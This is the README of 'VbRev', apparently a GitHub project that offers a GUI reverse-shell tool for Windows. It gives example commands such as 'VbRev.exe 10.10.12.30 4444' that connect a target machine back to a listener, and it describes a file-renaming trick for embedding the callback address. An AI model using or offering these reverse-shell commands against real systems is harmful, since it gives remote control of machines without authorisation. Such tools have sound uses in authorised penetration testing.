# VbRev
A GUI alternative to netcat etc for reverse shells on Windows machines.


## How to get it
Alpha release (v0.4) is now available to download under the **Releases** section on the right hand side of the page (or wherever github have moved that to this week)

## Usage

On your own machine just launch **VbRevUi.exe** and click Start Listener

On the server side pass in the IP of your machine and the port you're listening on:

`VbRev.exe 10.10.12.30 4444`

 If you are unable to pass arguments, name the exe like so: `VbRev_xxx_yyy.exe` where xxx is your IP address or hostname and yyy is the port number. So to connect to the same IP and port as the example above:
 
 `VbRev_10.10.12.30_4444.exe`
